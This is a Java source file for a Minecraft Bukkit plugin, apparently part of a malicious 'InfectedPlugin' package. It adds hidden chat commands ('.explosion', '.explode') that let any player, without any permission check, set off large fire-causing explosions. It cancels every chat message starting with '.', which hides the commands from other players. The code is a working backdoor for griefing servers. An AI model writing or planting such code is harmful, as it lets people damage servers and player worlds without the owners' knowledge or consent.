package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.*;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_explosion implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player player = event.getPlayer();
        Server server = Bukkit.getServer();
        boolean cancel = true;
        
        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".explosion") || args[0].equalsIgnoreCase(".explode"))
            {
                for (final Player target : server.getOnlinePlayers())
                {
                    target.getWorld().createExplosion(player.getLocation(), 10f, true);
                    target.sendMessage(ChatColor.DARK_RED + "BOOM!");
                }
                cancel = true;
            }
            if (cancel)
            {
                event.setCancelled(true);
                return;
            }
        }
    }
}
